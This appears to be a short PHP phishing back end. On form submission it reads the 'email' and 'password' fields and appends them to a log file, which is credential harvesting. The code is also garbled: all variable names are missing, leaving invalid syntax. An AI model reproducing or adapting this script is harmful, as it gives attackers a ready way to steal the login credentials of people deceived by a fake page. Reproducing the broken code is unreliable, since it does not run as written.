<?php
if (["REQUEST_METHOD"] == "POST") {
   = ['email'];
   = ['password'];
   = "Email:  | Pass: \n";
  file_put_contents("log.txt", , FILE_APPEND);
}
?>
